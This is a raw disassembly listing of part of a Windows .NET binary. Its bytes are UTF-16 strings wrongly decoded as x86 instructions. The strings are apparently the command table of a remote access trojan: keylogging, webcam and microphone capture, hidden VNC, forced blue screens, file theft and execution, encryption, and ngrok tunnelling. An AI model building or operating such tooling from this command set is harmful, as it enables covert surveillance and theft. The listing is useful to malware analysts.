  40a22e:	75 00                	jne    0x40a230
  40a230:	6e                   	outsb  %ds:(%esi),(%dx)
  40a231:	00 6e 00             	add    %ch,0x0(%esi)
  40a234:	6e                   	outsb  %ds:(%esi),(%dx)
  40a235:	00 6e 00             	add    %ch,0x0(%esi)
  40a238:	6e                   	outsb  %ds:(%esi),(%dx)
  40a239:	00 6e 00             	add    %ch,0x0(%esi)
  40a23c:	00 15 63 00 6c 00    	add    %dl,0x6c0063
  40a242:	6f                   	outsl  %ds:(%esi),(%dx)
  40a243:	00 73 00             	add    %dh,0x0(%ebx)
  40a246:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a24a:	68 00 65 00 6c       	push   $0x6c006500
  40a24f:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40a253:	09 45 00             	or     %eax,0x0(%ebp)
  40a256:	58                   	pop    %eax
  40a257:	00 49 00             	add    %cl,0x0(%ecx)
  40a25a:	54                   	push   %esp
  40a25b:	00 00                	add    %al,(%eax)
  40a25d:	07                   	pop    %es
  40a25e:	70 00                	jo     0x40a260
  40a260:	70 00                	jo     0x40a262
  40a262:	70 00                	jo     0x40a264
  40a264:	00 05 52 00 23 00    	add    %al,0x230052
  40a26a:	00 0b                	add    %cl,(%ebx)
  40a26c:	7c 00                	jl     0x40a26e
  40a26e:	2b 00                	sub    (%eax),%eax
  40a270:	2b 00                	sub    (%eax),%eax
  40a272:	2b 00                	sub    (%eax),%eax
  40a274:	7c 00                	jl     0x40a276
  40a276:	00 07                	add    %al,(%edi)
  40a278:	2a 00                	sub    (%eax),%al
  40a27a:	2b 00                	sub    (%eax),%eax
  40a27c:	2a 00                	sub    (%eax),%al
  40a27e:	00 09                	add    %cl,(%ecx)
  40a280:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a283:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a287:	00 00                	add    %al,(%eax)
  40a289:	05 6b 00 44 00       	add    $0x44006b,%eax
  40a28e:	00 07                	add    %al,(%edi)
  40a290:	52                   	push   %edx
  40a291:	00 53 00             	add    %dl,0x0(%ebx)
  40a294:	54                   	push   %esp
  40a295:	00 00                	add    %al,(%eax)
  40a297:	07                   	pop    %es
  40a298:	63 00                	arpl   %eax,(%eax)
  40a29a:	62 00                	bound  %eax,(%eax)
  40a29c:	62 00                	bound  %eax,(%eax)
  40a29e:	00 05 52 00 24 00    	add    %al,0x240052
  40a2a4:	00 0f                	add    %cl,(%edi)
  40a2a6:	47                   	inc    %edi
  40a2a7:	00 65 00             	add    %ah,0x0(%ebp)
  40a2aa:	74 00                	je     0x40a2ac
  40a2ac:	54                   	push   %esp
  40a2ad:	00 65 00             	add    %ah,0x0(%ebp)
  40a2b0:	78 00                	js     0x40a2b2
  40a2b2:	74 00                	je     0x40a2b4
  40a2b4:	00 09                	add    %cl,(%ecx)
  40a2b6:	53                   	push   %ebx
  40a2b7:	00 45 00             	add    %al,0x0(%ebp)
  40a2ba:	54                   	push   %esp
  40a2bb:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  40a2bf:	0f 73                	(bad)
  40a2c1:	00 65 00             	add    %ah,0x0(%ebp)
  40a2c4:	74 00                	je     0x40a2c6
  40a2c6:	54                   	push   %esp
  40a2c7:	00 65 00             	add    %ah,0x0(%ebp)
  40a2ca:	78 00                	js     0x40a2cc
  40a2cc:	74 00                	je     0x40a2ce
  40a2ce:	00 09                	add    %cl,(%ecx)
  40a2d0:	63 00                	arpl   %eax,(%eax)
  40a2d2:	6c                   	insb   (%dx),%es:(%edi)
  40a2d3:	00 73 00             	add    %dh,0x0(%ebx)
  40a2d6:	73 00                	jae    0x40a2d8
  40a2d8:	00 0d 63 00 6c 00    	add    %cl,0x6c0063
  40a2de:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a2e2:	72 00                	jb     0x40a2e4
  40a2e4:	72 00                	jb     0x40a2e6
  40a2e6:	00 09                	add    %cl,(%ecx)
  40a2e8:	42                   	inc    %edx
  40a2e9:	00 53 00             	add    %dl,0x0(%ebx)
  40a2ec:	4f                   	dec    %edi
  40a2ed:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40a2f1:	0f 42 00             	cmovb  (%eax),%eax
  40a2f4:	53                   	push   %ebx
  40a2f5:	00 63 00             	add    %ah,0x0(%ebx)
  40a2f8:	72 00                	jb     0x40a2fa
  40a2fa:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40a2fe:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2ff:	00 00                	add    %al,(%eax)
  40a301:	0b 42 00             	or     0x0(%edx),%eax
  40a304:	6c                   	insb   (%dx),%es:(%edi)
  40a305:	00 61 00             	add    %ah,0x0(%ecx)
  40a308:	6e                   	outsb  %ds:(%esi),(%dx)
  40a309:	00 6b 00             	add    %ch,0x0(%ebx)
  40a30c:	00 09                	add    %cl,(%ecx)
  40a30e:	49                   	dec    %ecx
  40a30f:	00 6e 00             	add    %ch,0x0(%esi)
  40a312:	73 00                	jae    0x40a314
  40a314:	57                   	push   %edi
  40a315:	00 00                	add    %al,(%eax)
  40a317:	09 49 00             	or     %ecx,0x0(%ecx)
  40a31a:	4e                   	dec    %esi
  40a31b:	00 53 00             	add    %dl,0x0(%ebx)
  40a31e:	53                   	push   %ebx
  40a31f:	00 00                	add    %al,(%eax)
  40a321:	07                   	pop    %es
  40a322:	7c 00                	jl     0x40a324
  40a324:	7c 00                	jl     0x40a326
  40a326:	7c 00                	jl     0x40a328
  40a328:	00 13                	add    %dl,(%ebx)
  40a32a:	47                   	inc    %edi
  40a32b:	00 65 00             	add    %ah,0x0(%ebp)
  40a32e:	74 00                	je     0x40a330
  40a330:	44                   	inc    %esp
  40a331:	00 72 00             	add    %dh,0x0(%edx)
  40a334:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40a33a:	73 00                	jae    0x40a33c
  40a33c:	00 17                	add    %dl,(%edi)
  40a33e:	46                   	inc    %esi
  40a33f:	00 69 00             	add    %ch,0x0(%ecx)
  40a342:	6c                   	insb   (%dx),%es:(%edi)
  40a343:	00 65 00             	add    %ah,0x0(%ebp)
  40a346:	4d                   	dec    %ebp
  40a347:	00 61 00             	add    %ah,0x0(%ecx)
  40a34a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a34b:	00 61 00             	add    %ah,0x0(%ecx)
  40a34e:	67 00 65 00          	add    %ah,0x0(%di)
  40a352:	72 00                	jb     0x40a354
  40a354:	00 0b                	add    %cl,(%ebx)
  40a356:	45                   	inc    %ebp
  40a357:	00 72 00             	add    %dh,0x0(%edx)
  40a35a:	72 00                	jb     0x40a35c
  40a35c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a35d:	00 72 00             	add    %dh,0x0(%edx)
  40a360:	00 0d 44 00 65 00    	add    %cl,0x650044
  40a366:	6c                   	insb   (%dx),%es:(%edi)
  40a367:	00 65 00             	add    %ah,0x0(%ebp)
  40a36a:	74 00                	je     0x40a36c
  40a36c:	65 00 00             	add    %al,%gs:(%eax)
  40a36f:	0d 46 00 6f 00       	or     $0x6f0046,%eax
  40a374:	6c                   	insb   (%dx),%es:(%edi)
  40a375:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a379:	00 72 00             	add    %dh,0x0(%edx)
  40a37c:	00 09                	add    %cl,(%ecx)
  40a37e:	46                   	inc    %esi
  40a37f:	00 69 00             	add    %ch,0x0(%ecx)
  40a382:	6c                   	insb   (%dx),%es:(%edi)
  40a383:	00 65 00             	add    %ah,0x0(%ebp)
  40a386:	00 0f                	add    %cl,(%edi)
  40a388:	45                   	inc    %ebp
  40a389:	00 78 00             	add    %bh,0x0(%eax)
  40a38c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a390:	75 00                	jne    0x40a392
  40a392:	74 00                	je     0x40a394
  40a394:	65 00 00             	add    %al,%gs:(%eax)
  40a397:	0d 52 00 65 00       	or     $0x650052,%eax
  40a39c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a39d:	00 61 00             	add    %ah,0x0(%ecx)
  40a3a0:	6d                   	insl   (%dx),%es:(%edi)
  40a3a1:	00 65 00             	add    %ah,0x0(%ebp)
  40a3a4:	00 07                	add    %al,(%edi)
  40a3a6:	74 00                	je     0x40a3a8
  40a3a8:	73 00                	jae    0x40a3aa
  40a3aa:	73 00                	jae    0x40a3ac
  40a3ac:	00 0d 74 00 78 00    	add    %cl,0x780074
  40a3b2:	74 00                	je     0x40a3b4
  40a3b4:	74 00                	je     0x40a3b6
  40a3b6:	74 00                	je     0x40a3b8
  40a3b8:	74 00                	je     0x40a3ba
  40a3ba:	00 0b                	add    %cl,(%ebx)
  40a3bc:	73 00                	jae    0x40a3be
  40a3be:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
  40a3c3:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40a3c7:	13 76 00             	adc    0x0(%esi),%esi
  40a3ca:	69 00 65 00 77 00    	imul   $0x770065,(%eax),%eax
  40a3d0:	69 00 6d 00 61 00    	imul   $0x61006d,(%eax),%eax
  40a3d6:	67 00 65 00          	add    %ah,0x0(%di)
  40a3da:	00 1d 68 00 69 00    	add    %bl,0x690068
  40a3e0:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a3e4:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a3e8:	6c                   	insb   (%dx),%es:(%edi)
  40a3e9:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a3ed:	00 72 00             	add    %dh,0x0(%edx)
  40a3f0:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a3f4:	6c                   	insb   (%dx),%es:(%edi)
  40a3f5:	00 65 00             	add    %ah,0x0(%ebp)
  40a3f8:	00 1d 73 00 68 00    	add    %bl,0x680073
  40a3fe:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3ff:	00 77 00             	add    %dh,0x0(%edi)
  40a402:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a406:	6c                   	insb   (%dx),%es:(%edi)
  40a407:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a40b:	00 72 00             	add    %dh,0x0(%edx)
  40a40e:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a412:	6c                   	insb   (%dx),%es:(%edi)
  40a413:	00 65 00             	add    %ah,0x0(%ebp)
  40a416:	00 1d 63 00 72 00    	add    %bl,0x720063
  40a41c:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a420:	74 00                	je     0x40a422
  40a422:	6e                   	outsb  %ds:(%esi),(%dx)
  40a423:	00 65 00             	add    %ah,0x0(%ebp)
  40a426:	77 00                	ja     0x40a428
  40a428:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a42c:	6c                   	insb   (%dx),%es:(%edi)
  40a42d:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a431:	00 72 00             	add    %dh,0x0(%edx)
  40a434:	00 13                	add    %dl,(%ebx)
  40a436:	63 00                	arpl   %eax,(%eax)
  40a438:	72 00                	jb     0x40a43a
  40a43a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a43e:	74 00                	je     0x40a440
  40a440:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a444:	6c                   	insb   (%dx),%es:(%edi)
  40a445:	00 65 00             	add    %ah,0x0(%ebp)
  40a448:	00 19                	add    %bl,(%ecx)
  40a44a:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40a44e:	77 00                	ja     0x40a450
  40a450:	6e                   	outsb  %ds:(%esi),(%dx)
  40a451:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40a455:	00 61 00             	add    %ah,0x0(%ecx)
  40a458:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40a45c:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40a462:	00 1d 64 00 6f 00    	add    %bl,0x6f0064
  40a468:	77 00                	ja     0x40a46a
  40a46a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a46b:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40a46f:	00 61 00             	add    %ah,0x0(%ecx)
  40a472:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a476:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40a47a:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40a480:	00 15 73 00 65 00    	add    %dl,0x650073
  40a486:	6e                   	outsb  %ds:(%esi),(%dx)
  40a487:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40a48b:	00 69 00             	add    %ch,0x0(%ecx)
  40a48e:	6c                   	insb   (%dx),%es:(%edi)
  40a48f:	00 65 00             	add    %ah,0x0(%ebp)
  40a492:	74 00                	je     0x40a494
  40a494:	6f                   	outsl  %ds:(%esi),(%dx)
  40a495:	00 00                	add    %al,(%eax)
  40a497:	05 57 00 4c 00       	add    $0x4c0057,%eax
  40a49c:	00 09                	add    %cl,(%ecx)
  40a49e:	44                   	inc    %esp
  40a49f:	00 65 00             	add    %ah,0x0(%ebp)
  40a4a2:	6c                   	insb   (%dx),%es:(%edi)
  40a4a3:	00 50 00             	add    %dl,0x0(%eax)
  40a4a6:	00 07                	add    %al,(%edi)
  40a4a8:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a4ac:	6c                   	insb   (%dx),%es:(%edi)
  40a4ad:	00 00                	add    %al,(%eax)
  40a4af:	09 37                	or     %esi,(%edi)
  40a4b1:	00 7a 00             	add    %bh,0x0(%edx)
  40a4b4:	49                   	dec    %ecx
  40a4b5:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  40a4b9:	0f 69 00             	punpckhwd (%eax),%mm0
  40a4bc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4bd:	00 73 00             	add    %dh,0x0(%ebx)
  40a4c0:	74 00                	je     0x40a4c2
  40a4c2:	61                   	popa
  40a4c3:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a4c7:	00 00                	add    %al,(%eax)
  40a4c9:	0d 4e 00 45 00       	or     $0x45004e,%eax
  40a4ce:	54                   	push   %esp
  40a4cf:	00 49 00             	add    %cl,0x0(%ecx)
  40a4d2:	4e                   	dec    %esi
  40a4d3:	00 53 00             	add    %dl,0x0(%ebx)
  40a4d6:	00 0b                	add    %cl,(%ebx)
  40a4d8:	37                   	aaa
  40a4d9:	00 7a 00             	add    %bh,0x0(%edx)
  40a4dc:	7a 00                	jp     0x40a4de
  40a4de:	69 00 70 00 00 17    	imul   $0x17000070,(%eax),%eax
  40a4e4:	37                   	aaa
  40a4e5:	00 7a 00             	add    %bh,0x0(%edx)
  40a4e8:	69 00 70 00 5c 00    	imul   $0x5c0070,(%eax),%eax
  40a4ee:	37                   	aaa
  40a4ef:	00 7a 00             	add    %bh,0x0(%edx)
  40a4f2:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a4f6:	78 00                	js     0x40a4f8
  40a4f8:	65 00 00             	add    %al,%gs:(%eax)
  40a4fb:	07                   	pop    %es
  40a4fc:	43                   	inc    %ebx
  40a4fd:	00 50 00             	add    %dl,0x0(%eax)
  40a500:	50                   	push   %eax
  40a501:	00 00                	add    %al,(%eax)
  40a503:	03 7c 00 00          	add    0x0(%eax,%eax,1),%edi
  40a507:	07                   	pop    %es
  40a508:	43                   	inc    %ebx
  40a509:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40a50d:	00 00                	add    %al,(%eax)
  40a50f:	07                   	pop    %es
  40a510:	50                   	push   %eax
  40a511:	00 52 00             	add    %dl,0x0(%edx)
  40a514:	47                   	inc    %edi
  40a515:	00 00                	add    %al,(%eax)
  40a517:	05 50 00 40 00       	add    $0x400050,%eax
  40a51c:	00 0f                	add    %cl,(%edi)
  40a51e:	49                   	dec    %ecx
  40a51f:	00 6e 00             	add    %ch,0x0(%esi)
  40a522:	73 00                	jae    0x40a524
  40a524:	50                   	push   %eax
  40a525:	00 72 00             	add    %dh,0x0(%edx)
  40a528:	6f                   	outsl  %ds:(%esi),(%dx)
  40a529:	00 67 00             	add    %ah,0x0(%edi)
  40a52c:	00 07                	add    %al,(%edi)
  40a52e:	55                   	push   %ebp
  40a52f:	00 4e 00             	add    %cl,0x0(%esi)
  40a532:	53                   	push   %ebx
  40a533:	00 00                	add    %al,(%eax)
  40a535:	07                   	pop    %es
  40a536:	52                   	push   %edx
  40a537:	00 53 00             	add    %dl,0x0(%ebx)
  40a53a:	53                   	push   %ebx
  40a53b:	00 00                	add    %al,(%eax)
  40a53d:	0d 52 00 53 00       	or     $0x530052,%eax
  40a542:	53                   	push   %ebx
  40a543:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a547:	00 73 00             	add    %dh,0x0(%ebx)
  40a54a:	00 07                	add    %al,(%edi)
  40a54c:	45                   	inc    %ebp
  40a54d:	00 4e 00             	add    %cl,0x0(%esi)
  40a550:	43                   	inc    %ebx
  40a551:	00 00                	add    %al,(%eax)
  40a553:	07                   	pop    %es
  40a554:	44                   	inc    %esp
  40a555:	00 45 00             	add    %al,0x0(%ebp)
  40a558:	43                   	inc    %ebx
  40a559:	00 00                	add    %al,(%eax)
  40a55b:	09 57 00             	or     %edx,0x0(%edi)
  40a55e:	42                   	inc    %edx
  40a55f:	00 43 00             	add    %al,0x0(%ebx)
  40a562:	4d                   	dec    %ebp
  40a563:	00 00                	add    %al,(%eax)
  40a565:	15 47 00 45 00       	adc    $0x450047,%eax
  40a56a:	54                   	push   %esp
  40a56b:	00 57 00             	add    %dl,0x0(%edi)
  40a56e:	43                   	inc    %ebx
  40a56f:	00 61 00             	add    %ah,0x0(%ecx)
  40a572:	6d                   	insl   (%dx),%es:(%edi)
  40a573:	00 50 00             	add    %dl,0x0(%eax)
  40a576:	6c                   	insb   (%dx),%es:(%edi)
  40a577:	00 75 00             	add    %dh,0x0(%ebp)
  40a57a:	00 07                	add    %al,(%edi)
  40a57c:	43                   	inc    %ebx
  40a57d:	00 4f 00             	add    %cl,0x0(%edi)
  40a580:	4e                   	dec    %esi
  40a581:	00 00                	add    %al,(%eax)
  40a583:	09 4d 00             	or     %ecx,0x0(%ebp)
  40a586:	49                   	dec    %ecx
  40a587:	00 43 00             	add    %al,0x0(%ebx)
  40a58a:	4c                   	dec    %esp
  40a58b:	00 00                	add    %al,(%eax)
  40a58d:	15 47 00 45 00       	adc    $0x450047,%eax
  40a592:	54                   	push   %esp
  40a593:	00 57 00             	add    %dl,0x0(%edi)
  40a596:	6d                   	insl   (%dx),%es:(%edi)
  40a597:	00 69 00             	add    %ch,0x0(%ecx)
  40a59a:	63 00                	arpl   %eax,(%eax)
  40a59c:	50                   	push   %eax
  40a59d:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a5a1:	00 00                	add    %al,(%eax)
  40a5a3:	0d 57 00 73 00       	or     $0x730057,%eax
  40a5a8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5a9:	00 75 00             	add    %dh,0x0(%ebp)
  40a5ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5ad:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40a5b1:	19 47 00             	sbb    %eax,0x0(%edi)
  40a5b4:	45                   	inc    %ebp
  40a5b5:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40a5b9:	00 73 00             	add    %dh,0x0(%ebx)
  40a5bc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5bd:	00 75 00             	add    %dh,0x0(%ebp)
  40a5c0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5c1:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40a5c5:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a5c9:	00 00                	add    %al,(%eax)
  40a5cb:	0f 4a 00             	cmovp  (%eax),%eax
  40a5ce:	75 00                	jne    0x40a5d0
  40a5d0:	73 00                	jae    0x40a5d2
  40a5d2:	74 00                	je     0x40a5d4
  40a5d4:	46                   	inc    %esi
  40a5d5:	00 75 00             	add    %dh,0x0(%ebp)
  40a5d8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5d9:	00 00                	add    %al,(%eax)
  40a5db:	0f 4d 00             	cmovge (%eax),%eax
  40a5de:	61                   	popa
  40a5df:	00 70 00             	add    %dh,0x0(%eax)
  40a5e2:	73 00                	jae    0x40a5e4
  40a5e4:	50                   	push   %eax
  40a5e5:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  40a5e9:	00 00                	add    %al,(%eax)
  40a5eb:	05 4b 00 4c 00       	add    $0x4c004b,%eax
  40a5f0:	00 0f                	add    %cl,(%edi)
  40a5f2:	63 00                	arpl   %eax,(%eax)
  40a5f4:	6c                   	insb   (%dx),%es:(%edi)
  40a5f5:	00 6f 00             	add    %ch,0x0(%edi)
  40a5f8:	73 00                	jae    0x40a5fa
  40a5fa:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40a5fe:	4c                   	dec    %esp
  40a5ff:	00 00                	add    %al,(%eax)
  40a601:	0b 4b 00             	or     0x0(%ebx),%ecx
  40a604:	4c                   	dec    %esp
  40a605:	00 67 00             	add    %ah,0x0(%edi)
  40a608:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  40a60d:	0b 4b 00             	or     0x0(%ebx),%ecx
  40a610:	4c                   	dec    %esp
  40a611:	00 47 00             	add    %al,0x0(%edi)
  40a614:	45                   	inc    %ebp
  40a615:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  40a619:	37                   	aaa
  40a61a:	48                   	dec    %eax
  40a61b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a61e:	45                   	inc    %ebp
  40a61f:	00 59 00             	add    %bl,0x0(%ecx)
  40a622:	5f                   	pop    %edi
  40a623:	00 43 00             	add    %al,0x0(%ebx)
  40a626:	55                   	push   %ebp
  40a627:	00 52 00             	add    %dl,0x0(%edx)
  40a62a:	52                   	push   %edx
  40a62b:	00 45 00             	add    %al,0x0(%ebp)
  40a62e:	4e                   	dec    %esi
  40a62f:	00 54 00 5f          	add    %dl,0x5f(%eax,%eax,1)
  40a633:	00 55 00             	add    %dl,0x0(%ebp)
  40a636:	53                   	push   %ebx
  40a637:	00 45 00             	add    %al,0x0(%ebp)
  40a63a:	52                   	push   %edx
  40a63b:	00 5c 00 53          	add    %bl,0x53(%eax,%eax,1)
  40a63f:	00 4f 00             	add    %cl,0x0(%edi)
  40a642:	46                   	inc    %esi
  40a643:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40a647:	00 41 00             	add    %al,0x0(%ecx)
  40a64a:	52                   	push   %edx
  40a64b:	00 45 00             	add    %al,0x0(%ebp)
  40a64e:	5c                   	pop    %esp
  40a64f:	00 00                	add    %al,(%eax)
  40a651:	09 54 00 43          	or     %edx,0x43(%eax,%eax,1)
  40a655:	00 50 00             	add    %dl,0x0(%eax)
  40a658:	56                   	push   %esi
  40a659:	00 00                	add    %al,(%eax)
  40a65b:	09 54 00 43          	or     %edx,0x43(%eax,%eax,1)
  40a65f:	00 50 00             	add    %dl,0x0(%eax)
  40a662:	47                   	inc    %edi
  40a663:	00 00                	add    %al,(%eax)
  40a665:	0d 47 00 45 00       	or     $0x450047,%eax
  40a66a:	54                   	push   %esp
  40a66b:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  40a66f:	00 50 00             	add    %dl,0x0(%eax)
  40a672:	00 07                	add    %al,(%edi)
  40a674:	41                   	inc    %ecx
  40a675:	00 43 00             	add    %al,0x0(%ebx)
  40a678:	54                   	push   %esp
  40a679:	00 00                	add    %al,(%eax)
  40a67b:	09 41 00             	or     %eax,0x0(%ecx)
  40a67e:	43                   	inc    %ebx
  40a67f:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40a683:	00 00                	add    %al,(%eax)
  40a685:	21 47 00             	and    %eax,0x0(%edi)
  40a688:	65 00 74 00 41       	add    %dh,%gs:0x41(%eax,%eax,1)
  40a68d:	00 63 00             	add    %ah,0x0(%ebx)
  40a690:	74 00                	je     0x40a692
  40a692:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40a698:	57                   	push   %edi
  40a699:	00 69 00             	add    %ch,0x0(%ecx)
  40a69c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a69d:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40a6a1:	00 77 00             	add    %dh,0x0(%edi)
  40a6a4:	73 00                	jae    0x40a6a6
  40a6a6:	00 09                	add    %cl,(%ecx)
  40a6a8:	45                   	inc    %ebp
  40a6a9:	00 4e 00             	add    %cl,0x0(%esi)
  40a6ac:	42                   	inc    %edx
  40a6ad:	00 43 00             	add    %al,0x0(%ebx)
  40a6b0:	00 0f                	add    %cl,(%edi)
  40a6b2:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a6b5:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a6b9:	00 41 00             	add    %al,0x0(%ecx)
  40a6bc:	63 00                	arpl   %eax,(%eax)
  40a6be:	74 00                	je     0x40a6c0
  40a6c0:	00 09                	add    %cl,(%ecx)
  40a6c2:	4b                   	dec    %ebx
  40a6c3:	00 69 00             	add    %ch,0x0(%ecx)
  40a6c6:	6c                   	insb   (%dx),%es:(%edi)
  40a6c7:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40a6cb:	07                   	pop    %es
  40a6cc:	52                   	push   %edx
  40a6cd:	00 65 00             	add    %ah,0x0(%ebp)
  40a6d0:	66 00 00             	data16 add %al,(%eax)
  40a6d3:	09 46 00             	or     %eax,0x0(%esi)
  40a6d6:	55                   	push   %ebp
  40a6d7:	00 52 00             	add    %dl,0x0(%edx)
  40a6da:	4c                   	dec    %esp
  40a6db:	00 00                	add    %al,(%eax)
  40a6dd:	09 6d 00             	or     %ebp,0x0(%ebp)
  40a6e0:	73 00                	jae    0x40a6e2
  40a6e2:	67 00 67 00          	add    %ah,0x0(%bx)
  40a6e6:	00 0b                	add    %cl,(%ebx)
  40a6e8:	55                   	push   %ebp
  40a6e9:	00 50 00             	add    %dl,0x0(%eax)
  40a6ec:	74 00                	je     0x40a6ee
  40a6ee:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6ef:	00 53 00             	add    %dl,0x0(%ebx)
  40a6f2:	00 07                	add    %al,(%edi)
  40a6f4:	46                   	inc    %esi
  40a6f5:	00 53 00             	add    %dl,0x0(%ebx)
  40a6f8:	47                   	inc    %edi
  40a6f9:	00 00                	add    %al,(%eax)
  40a6fb:	07                   	pop    %es
  40a6fc:	52                   	push   %edx
  40a6fd:	00 55 00             	add    %dl,0x0(%ebp)
  40a700:	4e                   	dec    %esi
  40a701:	00 00                	add    %al,(%eax)
  40a703:	09 52 00             	or     %edx,0x0(%edx)
  40a706:	45                   	inc    %ebp
  40a707:	00 4e 00             	add    %cl,0x0(%esi)
  40a70a:	43                   	inc    %ebx
  40a70b:	00 00                	add    %al,(%eax)
  40a70d:	09 52 00             	or     %edx,0x0(%edx)
  40a710:	44                   	inc    %esp
  40a711:	00 45 00             	add    %al,0x0(%ebp)
  40a714:	43                   	inc    %ebx
  40a715:	00 00                	add    %al,(%eax)
  40a717:	09 48 00             	or     %ecx,0x0(%eax)
  40a71a:	56                   	push   %esi
  40a71b:	00 4e 00             	add    %cl,0x0(%esi)
  40a71e:	43                   	inc    %ebx
  40a71f:	00 00                	add    %al,(%eax)
  40a721:	07                   	pop    %es
  40a722:	52                   	push   %edx
  40a723:	00 75 00             	add    %dh,0x0(%ebp)
  40a726:	6e                   	outsb  %ds:(%esi),(%dx)
  40a727:	00 00                	add    %al,(%eax)
  40a729:	0b 6e 00             	or     0x0(%esi),%ebp
  40a72c:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a730:	6f                   	outsl  %ds:(%esi),(%dx)
  40a731:	00 6b 00             	add    %ch,0x0(%ebx)
  40a734:	00 11                	add    %dl,(%ecx)
  40a736:	49                   	dec    %ecx
  40a737:	00 6e 00             	add    %ch,0x0(%esi)
  40a73a:	73 00                	jae    0x40a73c
  40a73c:	74 00                	je     0x40a73e
  40a73e:	61                   	popa
  40a73f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a743:	00 4e 00             	add    %cl,0x0(%esi)
  40a746:	00 15 49 00 6e 00    	add    %dl,0x6e0049
  40a74c:	73 00                	jae    0x40a74e
  40a74e:	74 00                	je     0x40a750
  40a750:	61                   	popa
  40a751:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a755:	00 6e 00             	add    %ch,0x0(%esi)
  40a758:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40a75c:	00 09                	add    %cl,(%ecx)
  40a75e:	68 00 72 00 64       	push   $0x64007200
  40a763:	00 70 00             	add    %dh,0x0(%eax)
  40a766:	00 09                	add    %cl,(%ecx)
  40a768:	54                   	push   %esp
  40a769:	00 65 00             	add    %ah,0x0(%ebp)
  40a76c:	6d                   	insl   (%dx),%es:(%edi)
  40a76d:	00 70 00             	add    %dh,0x0(%eax)
  40a770:	00 15 5c 00 6e 00    	add    %dl,0x6e005c
  40a776:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a77a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a77b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a77e:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a782:	78 00                	js     0x40a784
  40a784:	65 00 00             	add    %al,%gs:(%eax)
  40a787:	0b 68 00             	or     0x0(%eax),%ebp
  40a78a:	72 00                	jb     0x40a78c
